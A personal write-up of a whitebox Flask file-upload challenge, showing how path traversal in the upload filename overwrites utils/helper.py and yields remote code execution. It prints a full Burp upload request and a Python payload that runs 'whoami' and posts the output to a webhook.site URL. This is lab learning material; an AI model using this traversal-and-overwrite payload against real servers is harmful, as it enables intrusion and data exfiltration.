---
title: (English) Python-Flask file upload vulns
date: 2025-05-11 00:00:00 +0007
categories: [Write-up]
tags: [File upload vuln, English]

image:
  path: /assets/img/2025-05-11-FileUploadChall/cover.jpg

description: "My write-up for a Python-Flask file upload vuln challenge"

---
Because this is a whitebox file-upload challenge, things are a bit fuzzy, so I’ll go straight to reading the source:

```python
import os
import shutil
import threading
import time

from flask import Flask, render_template_string, request, session

app = Flask(__name__)

UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/uploader', methods=['POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['files']

        if 'main' in f.filename:
            return 'File upload error'

        if 'num_file' in session:
            session['num_file'] += 1
        else:
            session['num_file'] = 0

        file_path = os.path.join(UPLOAD_FOLDER, f.filename)
        print(file_path)
        f.save(file_path)

        try:
            from utils import helper
            helper.rename_file(file_path, os.path.join(UPLOAD_FOLDER, str(session['num_file']) + '.txt'))
        except Exception as e:
            return f"Lỗi xử lý file: {e}"

        return 'Tải file thành công.'

@app.route('/')
def index():
    name = request.args.get('name', 'Hacker')
    total = session.get('num_file', 0)
    template = """
    <html>
    <head>
        <title>Retro Uploader</title>
        <style>
            body {
                background-color: black;
                color: #00FF00;
                font-family: monospace;
                padding: 20px;
            }
            input, button {
                background-color: black;
                color: #00FF00;
                border: 1px solid #00FF00;
                padding: 5px;
                font-family: monospace;
            }
        </style>
    </head>
    <body>
        <h2>Welcome, {{name}}</h2>
        <p>You have uploaded {{total}} files.</p>
        <form method="POST" action="/uploader" enctype="multipart/form-data">
            <input type="file" name="files">
            <button type="submit">Upload</button>
        </form>
    </body>
    </html>
    """
    return render_template_string(template, name=name, total=total)

if __name__ == '__main__':
    t = threading.Thread(target=restore_helper)
    t.daemon = True
    t.start()
    app.run(debug=False, host='0.0.0.0', port=8008, use_reloader=True, threaded=True)
```

## A few initial subjective notes:

The main route of the challenge is at `/uploader`. A few points that (to me) look interesting:

### 1. The main function

```python
if __name__ == '__main__':
    t = threading.Thread(target=restore_helper) # restore_helper?, and why start this in a new thread?
    t.daemon = True
    t.start()
    app.run(debug=False, host='0.0.0.0', port=8008, use_reloader=True, threaded=True)
```

I haven’t coded a lot of web stuff and haven’t done many Flask challenges, so I had to search a bit. After getting the gist, a couple of questions popped up:

- Why spawn a separate thread only to run `restore_helper`?
- Why set `daemon = True` — what does that actually do?

=> Reading up on this, everything points to this thread running in the background and doing some “restore” job — exactly like the function name suggests: `restore_helper`.

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image11.png" | relative_url }})

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image1.png" | relative_url }})

---

### 2. Route `/uploader`

```python
if 'main' in f.filename:
    return 'File upload error'
```

**The filename isn’t allowed to contain the string `"main"`**? => Kinda sus — usually the stuff users “shouldn’t” do is exactly what little gremlins like us should poke at.

---

The path where the file is saved is stored in `file_path`, built like this: `file_path = os.path.join(UPLOAD_FOLDER, f.filename)`

`UPLOAD_FOLDER` itself is derived from `UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), 'uploads')`, i.e. the `uploads` folder sits next to `main.py`.

--- 

After creating and saving `file_path`, there’s a very juicy bit:

```python
try:
    from utils import helper
    helper.rename_file(file_path, os.path.join(UPLOAD_FOLDER, str(session['num_file']) + '.txt'))
except Exception as e:
    return f"Lỗi xử lý file: {e}"
```

- `from utils import helper`? In web projects, it’s common to have folders like `utils`, `app`, `uploads`, etc. So I immediately suspected a `utils` folder alongside `main.py`, and inside it a `helper.py` file.
- The line right under calls `helper.rename_file`, i.e. a function living in `helper`. So, yep, there’s a `utils/helper.py` in play.

## Building up the idea

**=> Chaining all that together, `helper.py` has to be “something”, for a couple of reasons:**
- There’s a function called `restore_helper` always running in the background. It isn’t even written in `main.py` (looks like it was removed from the provided source for some reason).
- If `helper.py` only exists to provide `rename_file()`, then… why do we need something to “restore” it? Especially when filenames are already constrained.
- Also, the challenge forbids uploading a file named `main` => implying we’re *not* supposed to modify `main.py`.
- It’s a file upload challenge, often accompanied by path traversal. Here, traversal is 100% allowed (no filter on `../`). So we can leverage `../` to traverse back from `main.py` and target `/utils/helper.py` => i.e. upload using `filename = ../utils/helper.py`.

**=> Given all that, here’s my hypothesis: what if we upload a file named `helper.py` into `/utils` so it becomes `/utils/helper.py` — will it overwrite the original file, and will `main.py` then import and execute *our* version?**

Since we can’t directly view uploaded files, I’ll validate by making a request to a webhook. If the webhook receives it, that proves our approach worked — we overwrote `helper.py`, and it got executed.

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image2.png" | relative_url }})

`Lỗi xử lý file: module 'utils.helper' has no attribute 'rename_file'` => We hit the `except` path. This error shows we successfully changed `helper.py`, and now it no longer has `rename_file`, hence “no attribute”. So yes, we can modify `helper.py`.

=> After poking around, I realized it’s simpler to just *replace* `rename_file` instead of defining a new function, since `rename_file` is already called by `main.py`.

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image3.png" | relative_url }})

Looks reasonable, but this time it complains about missing params.

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image4.png" | relative_url }})

=> `Lỗi xử lý file: No module named 'requests'` =)) likely the server environment doesn’t have `requests` installed. So we need a way that doesn’t rely on extra packages. Ideally something from the Python standard library.

Another path: reuse already-imported libraries => 100% usable. The tastiest one is `os`. I tried the simplest approach with `curl`, but that likely won’t work if `curl` isn’t installed on the box.

So the new question: **“Is there a way to make an HTTP request in Python without `requests`?”** => The tip was to use `urllib.request`, which *is* part of the standard library. Exactly what I needed.

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image5.png" | relative_url }})


=> Using `urllib.request`, my `rename_file` just pings the webhook like so:

```python
def rename_file(a,b):
    import urllib.request
    urllib.request.urlopen("https://webhook.site/3262fb17-7439-4e6f-a284-b56b7c710cf4")
```

=> I threw it into Burp with a full HTTP request. The fields I changed were the `filename` and the file content:

```
POST /uploader HTTP/1.1
Host: 113.171.248.61:8008
Content-Length: 333
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://113.171.248.61:8008
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXcPpDrFHoeoueZrJ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://113.171.248.61:8008/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJudW1fZmlsZSI6Mn0.aB7eyg.c3bUkOPwXjXIdMrwO5oB53LsGSM
Connection: keep-alive

------WebKitFormBoundaryXcPpDrFHoeoueZrJ
Content-Disposition: form-data; name="files"; filename="../utils/helper.py"
Content-Type: text/x-python

def rename_file(a,b):
    import urllib.request
    urllib.request.urlopen("https://webhook.site/3262fb17-7439-4e6f-a284-b56b7c710cf4")
------WebKitFormBoundaryXcPpDrFHoeoueZrJ--

```

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image6.png" | relative_url }})

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image7.png" | relative_url }})

Hehe, that’s beautiful. Our hunch was right: we can upload a file named `helper.py`, then use path traversal to land it exactly at `/utils/helper.py`, overwriting the original — and it *does* get imported/executed.

---

## Exploit: RCE

The prompt didn’t specify how far to take exploitation, so I’ll go as deep as I can. With my current skill level, the natural goal is RCE: run OS commands on the server.

At first, I thought about using the already-imported `os` module. But after some tinkering, I hit these issues:
- You could use built-in tools like `wget` to send requests, *if* present.
- Capturing output from OS commands is tricky. Concretely:
    - For a command like `whoami`, I wanted to capture its output string and send it via the webhook.
    - But testing showed that doing something like `tmp = os.system('whoami')` then `print(tmp)` returns:

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image8.png" | relative_url }})
> Note: `msi\\anhcd` is the result on line 8; line 9 is the `print` of `tmp`.

What does this mean? It means `tmp` is not the output, but the **exit code** (0). That’s useless for exfiltrating command results. I want the actual output from line 8 — that’s the annoying part.
> Searching around confirms: assigning like that gives you the exit code (i.e., success/failure), not stdout.

=> Dead end. I looked for another way with the same idea and landed on Python’s standard `subprocess` module. It’s designed to run subprocesses and capture output easily. It’s basically a better `os.system`.

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image9.png" | relative_url }})
> https://docs.python.org/3/library/subprocess.html

Payload for RCE:
```python
def rename_file(a,b):
    import subprocess
    import urllib.request
    import urllib.parse
    
    command = subprocess.check_output(['whoami']).decode('utf-8').strip()
    
    data = urllib.parse.urlencode({'result': command}).encode('utf-8')
    
    req = urllib.request.Request(
        url='https://webhook.site/3262fb17-7439-4e6f-a284-b56b7c710cf4',
        data=data,
        method='POST'
    )
    
    with urllib.request.urlopen(req) as resp:
        print(f'Status: {resp.status}')
        print(resp.read().decode())
```

![image]({{ "/assets/img/2025-05-11-FileUploadChall/image10.png" | relative_url }})

So we successfully executed `whoami` => **RCE done, hehe**.
